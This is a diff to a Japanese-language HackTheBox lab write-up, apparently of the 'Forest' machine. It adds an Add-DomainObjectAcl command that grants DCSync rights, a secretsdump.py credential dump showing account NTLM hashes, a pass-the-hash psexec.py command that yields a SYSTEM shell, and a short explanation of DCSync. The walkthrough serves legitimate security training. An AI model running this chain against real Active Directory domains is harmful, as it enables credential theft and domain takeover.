@@ -59,8 +59,11 @@ The command completed successfully.
 > To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.
 
 ```
-*Evil-WinRM* PS C:\Users\svc-alfresco> Add-DomainObjectAcl -PrincipalIdentity shoebill -TargetIdentity htb.local -Rights DCSync
+*Evil-WinRM* PS C:\Users\svc-alfresco> Add-DomainObjectAcl -PrincipalIdentity shoebill -TargetIdentity 'DC=htb, DC=local' -Rights DCSync
 ```
+＝「**htb.local**のアカウント**shoeiblll**に**DCSync**のprivilegeを持たせる」
+
+注）`Add-DomainObjectAcl -PrincipalIdentity shoebill -TargetIdentity htb.local -Rights DCSync`ではエラー！（DCはDomain Component）.
 
 > `Add-DomainObjectAcl`: Adds an ACL for a specific active directory object. This function modifies the ACL/ACE entries for a given Active Directory target object specified by `-TargetIdentity`.  These rights are granted on the target object for the specified `-PrincipalIdentity`.
 
@@ -69,12 +72,43 @@ DCSyncのprivielgeを持ったユーザが作成できたら、**secretsdump.py*
 ```
 ┌──(kali㉿kali)-[~]
 └─$ secretsdump.py 'htb.local/shoebill:Passw0rd!@10.10.10.161'
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+...
+```
+
+最後にPass the HashでAdminのシェルゲット
+
+```
+┌──(kali㉿kali)-[~]
+└─$ psexec.py Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+
+Impacket v0.9.24.dev1+20211015.125134.c0ec6102 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file zEmdPRll.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service saol on 10.10.10.161.....
+[*] Starting service saol.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
 ```
 
 
+## DCSync攻撃について
 
-
-
+**自分がドメインコントローラになりすますことでドメイン内のユーザハッシュが上記のように取れる。**
 
 
 
